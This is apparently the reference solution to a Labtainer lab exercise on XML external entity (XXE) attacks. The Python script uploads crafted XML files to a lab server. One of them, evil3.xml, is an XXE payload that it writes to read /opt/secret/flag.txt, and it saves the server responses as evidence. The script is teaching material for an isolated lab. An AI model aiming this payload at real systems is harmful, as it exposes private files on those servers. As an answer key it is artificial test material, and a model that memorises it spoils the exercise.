#!/usr/bin/env python3
"""Reference solution for the isolated web-xxe Labtainer exercise."""
import mimetypes
from pathlib import Path
import uuid
from urllib.error import HTTPError
from urllib.request import Request, urlopen


SERVER = "http://192.168.99.100:3000/file-upload"
HOME = Path.home()
DESKTOP = HOME / "Desktop"


def multipart_file(filename, body):
    boundary = "----Labtainer" + uuid.uuid4().hex
    content_type = mimetypes.guess_type(filename)[0] or "application/xml"
    prefix = ("--{}\r\n"
              'Content-Disposition: form-data; name="file"; filename="{}"\r\n'
              "Content-Type: {}\r\n\r\n").format(boundary, filename, content_type).encode()
    return prefix + body + "\r\n--{}--\r\n".format(boundary).encode(), boundary


def upload(xml_path):
    payload, boundary = multipart_file(xml_path.name, xml_path.read_bytes())
    request = Request(SERVER, payload, {"Content-Type": "multipart/form-data; boundary={}".format(boundary)})
    request.get_method = lambda: "POST"
    try:
        with urlopen(request, timeout=20) as response:
            return response.read()
    except HTTPError as error:  # A 410 response intentionally includes the disclosed content.
        return error.read()


def main() -> None:
    DESKTOP.mkdir(exist_ok=True)
    payloads = {
        "evil1.xml": HOME / "evil1.xml",
        "evil2.xml": HOME / "evil2.xml",
        "evil3.xml": HOME / "evil3.xml",
    }
    payloads["evil3.xml"].write_text(
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///opt/secret/flag.txt">]><foo>&xxe;</foo>',
        encoding="utf-8",
    )
    report_rows = []
    for filename, xml_path in payloads.items():
        response = upload(xml_path)
        raw_path = DESKTOP / "{}.raw".format(xml_path.stem)
        raw_path.write_bytes(response)
        report_rows.append("<li>{}: response saved as {}</li>".format(filename, raw_path.name))
    (HOME / "report_zap.html").write_text(
        "<!doctype html><html><body><h1>XXE test report</h1><ul>" + "".join(report_rows) + "</ul></body></html>",
        encoding="utf-8",
    )
    print("XXE evidence and report_zap.html written successfully")


if __name__ == "__main__":
    main()
